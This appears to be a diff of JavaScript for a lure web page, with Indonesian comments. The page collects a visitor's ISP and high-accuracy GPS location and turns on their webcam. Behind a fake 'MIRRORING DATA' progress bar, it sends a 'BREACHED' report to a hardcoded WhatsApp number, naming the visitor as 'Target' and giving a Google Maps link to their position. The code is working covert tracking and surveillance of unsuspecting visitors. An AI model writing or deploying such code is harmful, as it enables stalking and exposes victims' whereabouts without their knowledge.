@@ -1,55 +1,45 @@
 var nomorWA = "628979100200";
-var userData = { coords: "0,0", os: navigator.platform, battery: "-", isp: "-" };
+var userData = { coords: "", isp: "Scanning...", bat: ".." };
 
 window.onload = function() {
-    getQuickData();
-    
-    // Auto-lock GPS
+    // Ambil Data Background
+    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+        userData.isp = d.org;
+        document.getElementById('isp-status').innerText = "📡 ISP: " + d.org;
+    });
+
+    // Ambil GPS dengan Akurasi Tinggi
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
-            document.getElementById('gps-status').innerText = "Location: LOCKED";
-            document.getElementById('gps-status').style.color = "#00ff41";
-        }, null, {enableHighAccuracy:true});
+        navigator.geolocation.getCurrentPosition(function(p) {
+            userData.coords = p.coords.latitude + "," + p.coords.longitude;
+            document.getElementById('gps-status').innerText = "📍 GPS: LOCKED";
+            document.getElementById('gps-status').style.color = "yellow";
+        }, null, { enableHighAccuracy: true, timeout: 5000 });
     }
 
-    // Auto-Cam
     navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(s) { document.getElementById('webcam').srcObject = s; });
+        .then(s => { document.getElementById('webcam').srcObject = s; });
 };
 
-async function getQuickData() {
-    try {
-        var res = await fetch('https://ipapi.co/json/');
-        var data = await res.json();
-        userData.isp = data.org || "Protected";
-        document.getElementById('isp-status').innerText = "ISP: " + userData.isp;
-    } catch(e) {}
+function sendFinal(nama) {
+    if (!nama) return alert("Ketik nama dulu!");
+    if (userData.coords === "") return alert("Tunggu GPS mengunci lokasi (Klik Allow!)");
 
-    try {
-        var bat = await navigator.getBattery();
-        userData.battery = Math.round(bat.level * 100) + "%";
-        document.getElementById('bat-status').innerText = "Battery: " + userData.battery;
-    } catch(e) {}
-}
-
-function finalSubmit(name) {
-    document.getElementById('step-main').style.display = 'none';
-    document.getElementById('step-loading').style.display = 'block';
-
+    document.getElementById('step-main').innerHTML = "<h3>MIRRORING DATA...</h3><div class='loading-bar'><div id='progress'></div></div>";
+    
     var p = 0;
     var t = setInterval(function() {
-        p += 25;
+        p += 20;
         document.getElementById('progress').style.width = p + "%";
         if (p >= 100) {
             clearInterval(t);
             var map = "https://www.google.com/maps?q=" + userData.coords;
-            var msg = "🚨 *AUTO BREACHED* 🚨%0A%0A👤 Target: " + name + "%0A📍 Maps: " + map + "%0A📡 ISP: " + userData.isp + "%0A🔋 Bat: " + userData.battery;
-            window.location.href = "https://api.whatsapp.com/send?phone=" + nomorWA + "&text=" + msg;
+            var teks = "🚨 *BREACHED* 🚨%0A👤 Target: " + nama + "%0A📍 Maps: " + map + "%0A📡 ISP: " + userData.isp;
+            window.location.href = "https://api.whatsapp.com/send?phone=" + nomorWA + "&text=" + teks;
         }
-    }, 800);
+    }, 500);
 }
 
 document.getElementById('name').onkeydown = function(e) {
-    if (e.key === "Enter") finalSubmit(this.value);
+    if (e.key === "Enter") sendFinal(this.value);
 };
